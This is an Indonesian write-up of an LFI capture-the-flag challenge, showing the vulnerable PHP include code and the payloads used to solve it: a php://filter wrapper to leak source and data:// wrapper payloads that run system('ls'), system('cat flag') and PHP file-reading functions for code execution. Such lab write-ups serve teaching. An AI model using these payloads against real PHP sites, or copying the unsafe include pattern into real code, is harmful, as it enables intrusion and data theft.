# Write Up One Line LFI Challenge JHack Semi Final CTF

Pada saat kompetisi kita diberikan source dan penampakanya seperti ini

![](/JHackCTF/LFI/img/index.png)


Mari kita petakan source codenya.

```
<?php 
if(!isset($_GET['file'])){
    die(show_source(__FILE__));
}else{
    $file = $_GET['file'] .".php";
```

Pada kode tersebut, Mengecek apa ada sebuah input dengan param `file` jika tidak ada kode akan berhenti dan menampilkan isi kodenya.

```

if(strpos($file, "ftp") !== False){ die('No Cheat!');}
if(strpos($file, "http") !== False){ die('Hmmm No Cheat!');}
if(strpos($file, "https") !== False){ die('No Fucking Cheat!');}

```

Pada kode tersebut mengecek apakah inputan kita mengandung `ftp/http/https` Jika iya program akan berhenti dan mengeluarkan pesan.

```
include($file);
```

Pada kode tersebut inputan kita akan di include jika sudah lolos tiap pengecekan yang ada.


Oke secara jelas kode ini vuln ke LFI seperti judulnya, Namun pada variable $file inputan kita akan mendapat suffix `.php` jadi kita tidak bisa melakukan `../../../../../../` karena akan ketambahan `.php`. Namun saya bisa mencoba melakukan. Wrapper php filter.


`?file=php://filter/convert.base64-encode/resource=index` Woops dan success.

```
PD9waHAgCmlmKCFpc3NldCgkX0dFVFsnZmlsZSddKSl7CiAgICBkaWUoc2hvd19zb3VyY2UoX19GSUxFX18pKTsKfWVsc2V7CiAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ10gLiIucGhwIjsKCgppZihzdHJwb3MoJGZpbGUsICJmdHAiKSAhPT0gRmFsc2UpeyBkaWUoJ05vIENoZWF0IScpO30KaWYoc3RycG9zKCRmaWxlLCAiaHR0cCIpICE9PSBGYWxzZSl7IGRpZSgnSG1tbSBObyBDaGVhdCEnKTt9CmlmKHN0cnBvcygkZmlsZSwgImh0dHBzIikgIT09IEZhbHNlKXsgZGllKCdObyBGdWNraW5nIENoZWF0IScpO30KCmluY2x1ZGUoJGZpbGUpOwoKfQo=
```

Wooooooo bisa, Dan saat di decode :( Tidak menemukan apa apa selain hanya source dari index tersebut. Setelah searching kita bisa mengunakan wrapper `data://` Untuk melakukan RCE? Hmm mari kita coba.


Pertama saya mengunakan payload seperti ini `data://text/plain,<?=phpinfo()?>//` Untuk menampilkan phpinfo dannnn Success.

![](/JHackCTF/LFI/img/go.png)

Dan kita tinggal modify payload kita menjadi seperti ini 
 - `data://text/plain,<?=system('ls')?>//` Untuk Melihat isi dir dan mendapat ada file `flag` 
 - `data://text/plain,<?=system('cat flag')?>//` Dan mendapatkan `flag`

Dam didapatkan flagnya. Namun itu jika system shellnya di enable? Namun jika tidak? Kita bisa mengexec kode php untuk mendapatkan flagnya.

 - `data://text/plain,<?=print_r(scandir(getcwd()))?>//` Ini fungsinya sama seperti `ls` kode `getcwd()` Untuk mendapatkan lokasi file tersebut.
 - `data://text/plain,<?=file_get_contents('flag')?>//` Ini sama dengan `cat`



Sekian untuk Write Up Kali ini!  